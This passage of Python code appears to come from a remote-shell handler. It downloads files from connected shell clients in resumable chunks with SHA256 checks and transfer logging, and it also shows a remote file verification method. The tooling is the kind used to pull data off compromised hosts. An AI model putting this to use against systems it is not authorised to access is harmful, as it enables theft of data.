                        print(
                            f"{self.h.colors['yellow']}Local file tail mismatch "
                            f"at offset {self._format_size(aligned)} — "
                            f"restarting{self.h.colors['end']}"
                        )
                        transferred = 0
                        mode = 'wb'
            elif local_partial == 0:
                transferred = 0
                mode = 'wb'

        print(
            f"{self.h.colors['yellow']}Downloading {remote_path} -> {local_path} "
            f"({self._format_size(remote_size)}, chunk={self._format_size(chunk_size)}){self.h.colors['end']}"
        )
        print(f"{self.h.colors['yellow']}Computing remote SHA256...{self.h.colors['end']}", end='', flush=True)
        remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
        if remote_hash:
            print(f"\r{self.h.colors['blue']}Remote SHA256: {remote_hash}{self.h.colors['end']}          ")
        else:
            print(f"\r{self.h.colors['red']}Could not compute remote hash — aborting{self.h.colors['end']}")
            return False

        if state and state.get('sha256') and state.get('sha256') != remote_hash:
            print(f"{self.h.colors['yellow']}Remote file changed — restarting download{self.h.colors['end']}")
            transferred = 0
            mode = 'wb'
            self._clear_state(state_path)

        self.h._flush_shell(client_sock)
        local_dir = os.path.dirname(os.path.abspath(local_path))
        if local_dir:
            os.makedirs(local_dir, exist_ok=True)

        start = time.time()
        chunk_index = transferred // chunk_size if chunk_size else 0
        try:
            with open(local_path, mode) as f:
                if transferred > 0:
                    f.seek(transferred)
                while transferred < remote_size:
                    read_size = min(chunk_size, remote_size - transferred)
                    data = self.h._remote_read_chunk(
                        client_sock, remote_path, transferred, read_size, shell_type, chunk_index
                    )
                    if data is None:
                        self._save_state(state_path, {
                            'direction': 'download',
                            'local_path': os.path.abspath(local_path),
                            'remote_path': remote_path,
                            'transferred': transferred,
                            'total': remote_size,
                            'sha256': remote_hash,
                            'shell_type': shell_type,
                            'chunk_size': chunk_size,
                        })
                        print(
                            f"\n{self.h.colors['red']}Download failed at "
                            f"{self._format_size(transferred)} — resume with: "
                            f"download --resume <remote> <local>{self.h.colors['end']}"
                        )
                        self._log_transfer(
                            client_sock, 'download', local_path, remote_path,
                            'interrupted', f"offset={transferred}"
                        )
                        return False
                    f.write(data)
                    transferred += len(data)
                    chunk_index += 1
                    self._save_state(state_path, {
                        'direction': 'download',
                        'local_path': os.path.abspath(local_path),
                        'remote_path': remote_path,
                        'transferred': transferred,
                        'total': remote_size,
                        'sha256': remote_hash,
                        'shell_type': shell_type,
                        'chunk_size': chunk_size,
                    })
                    self._print_progress(transferred, remote_size, start, 'Download')
        except OSError as e:
            print(f"\n{self.h.colors['red']}Download error: {e}{self.h.colors['end']}")
            self._log_transfer(client_sock, 'download', local_path, remote_path, 'error', str(e))
            return False

        print(f"\n{self.h.colors['yellow']}Verifying local integrity...{self.h.colors['end']}", end='', flush=True)
        local_hash = self.h._sha256_file(local_path)
        if local_hash == remote_hash:
            print(f"\r{self.h.colors['green']}Integrity verified — SHA256 match{self.h.colors['end']}          ")
            print(f"{self.h.colors['green']}Download complete: {local_path}{self.h.colors['end']}")
            self._clear_state(state_path)
            self._log_transfer(client_sock, 'download', local_path, remote_path, 'complete')
            return True
        print(f"\r{self.h.colors['red']}Integrity mismatch!{self.h.colors['end']}                          ")
        print(f"  Remote: {remote_hash}")
        print(f"  Local:  {local_hash}")
        self._log_transfer(client_sock, 'download', local_path, remote_path, 'hash_mismatch')
        return False

    def verify_file(self, client_sock, remote_path):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
            return
        shell_type = info.get('type', 'unknown')
        remote_size = self.h._remote_file_size(client_sock, remote_path, shell_type)
        if remote_size is None:
            print(f"{self.h.colors['red']}Remote file not found: {remote_path}{self.h.colors['end']}")
            return
        remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
        print(f"{self.h.colors['green']}Remote file:{self.h.colors['end']} {remote_path}")
        print(f"  Size:   {self._format_size(remote_size)} ({remote_size} bytes)")
        print(f"  SHA256: {remote_hash or 'unavailable'}")
